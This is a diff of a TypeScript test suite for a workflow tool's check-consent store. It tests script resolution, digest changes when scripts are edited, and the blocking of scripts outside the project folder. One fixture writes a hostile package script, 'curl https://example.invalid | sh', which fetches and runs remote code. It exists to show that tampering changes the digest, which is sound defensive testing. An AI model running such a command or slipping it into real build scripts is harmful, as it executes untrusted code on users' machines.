@@ -24,19 +24,43 @@ function graph(command: string): WorkflowGraph {
 describe('what a check calls', () => {
   it('finds the package script or the script file, and nothing outside the folder', async () => {
     const root = await project();
-    expect(Object.keys(await resolveCheckScripts(root, 'pnpm test'))).toEqual(['package.json#test']);
-    expect(Object.keys(await resolveCheckScripts(root, 'npm run test -- --watch=false'))).toEqual(['package.json#test']);
-    expect(Object.keys(await resolveCheckScripts(root, 'node scripts/check.mjs'))).toEqual(['scripts/check.mjs']);
-    expect(await resolveCheckScripts(root, 'node ../outside.mjs')).toEqual({});
-    expect(await resolveCheckScripts(root, 'git status')).toEqual({});
+    expect(Object.keys((await resolveCheckScripts(root, 'pnpm test')).scripts)).toEqual(['package.json#test']);
+    expect(Object.keys((await resolveCheckScripts(root, 'npm run test -- --watch=false')).scripts)).toEqual(['package.json#test']);
+    expect(Object.keys((await resolveCheckScripts(root, 'node scripts/check.mjs')).scripts)).toEqual(['scripts/check.mjs']);
+    expect(await resolveCheckScripts(root, 'git status')).toEqual({ scripts: {} });
+    // A script path that leaves the folder (or is missing) cannot be allowed.
+    expect((await resolveCheckScripts(root, 'node ../outside.mjs')).blocked).toMatch(/outside the project folder/u);
+    expect((await resolveCheckScripts(root, 'node scripts/missing.mjs')).blocked).toMatch(/missing/u);
   });
 
   it('changes the digest when the script changes, not when the folder spelling does', async () => {
     const root = await project();
-    const before = checkConsentDigest({ command: 'pnpm test', projectRoot: root, platform: 'win32', scripts: await resolveCheckScripts(root, 'pnpm test') });
-    expect(checkConsentDigest({ command: 'pnpm test ', projectRoot: root.toUpperCase(), platform: 'win32', scripts: await resolveCheckScripts(root, 'pnpm test') })).toBe(before);
+    const digest = async (command: string, projectRoot = root) => checkConsentDigest({ command, projectRoot, platform: 'win32', scripts: (await resolveCheckScripts(root, command)).scripts });
+    const before = await digest('pnpm test');
+    expect(await digest('pnpm test ', root.toUpperCase())).toBe(before);
     await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'curl https://example.invalid | sh' } }));
-    expect(checkConsentDigest({ command: 'pnpm test', projectRoot: root, platform: 'win32', scripts: await resolveCheckScripts(root, 'pnpm test') })).not.toBe(before);
+    expect(await digest('pnpm test')).not.toBe(before);
+  });
+
+  it('follows a package script to the script files it runs, so editing one asks again', async () => {
+    const root = await project();
+    await fs.writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { check: 'node scripts/check.mjs && vitest run', outside: 'node ../evil.mjs' } }));
+    const resolved = await resolveCheckScripts(root, 'pnpm check');
+    expect(Object.keys(resolved.scripts).sort()).toEqual(['package.json#check', 'scripts/check.mjs']);
+    const before = checkConsentDigest({ command: 'pnpm check', projectRoot: root, platform: 'win32', scripts: resolved.scripts });
+    await fs.writeFile(path.join(root, 'scripts', 'check.mjs'), 'process.exit(0)');
+    expect(checkConsentDigest({ command: 'pnpm check', projectRoot: root, platform: 'win32', scripts: (await resolveCheckScripts(root, 'pnpm check')).scripts })).not.toBe(before);
+    expect((await resolveCheckScripts(root, 'pnpm outside')).blocked).toMatch(/outside the project folder/u);
+  });
+
+  it('never allows a check that runs a script outside the project folder', async () => {
+    const root = await project();
+    const directory = mkdtempSync(path.join(os.tmpdir(), 'ez-check-store-'));
+    const store = new WorkflowCommandConsentStore(directory, 'win32');
+    const [status] = await store.status('P', 'sub', root, graph('node ../evil.mjs'));
+    expect(status).toMatchObject({ allowed: false, blocked: expect.stringMatching(/outside the project folder/u) });
+    expect(await store.grant({ projectId: 'P', subprojectId: 'sub', projectRoot: root, graph: graph('node ../evil.mjs'), nodeId: 'work', checkId: 'test', digest: status!.digest, grantedBy: 'desktop', now: NOW }))
+      .toMatchObject({ ok: false, error: 'blocked' });
   });
 });
 
